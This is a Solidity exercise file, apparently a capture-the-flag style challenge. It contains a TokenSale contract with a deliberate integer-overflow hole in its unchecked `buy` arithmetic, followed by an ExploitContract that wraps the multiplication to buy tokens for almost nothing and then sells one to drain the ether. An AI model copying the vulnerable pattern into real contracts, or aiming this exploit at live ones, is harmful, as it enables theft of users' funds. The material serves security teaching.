// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    // write your exploit functions below
    function exploit() public payable {
        uint numTokens = (type(uint256).max / 1 ether) + 1;
        uint amount;
        unchecked {
            amount += numTokens * 1 ether;
        }

        tokenSale.buy{value: amount}(numTokens);
        tokenSale.sell(1);
    }

    receive() external payable {}
}
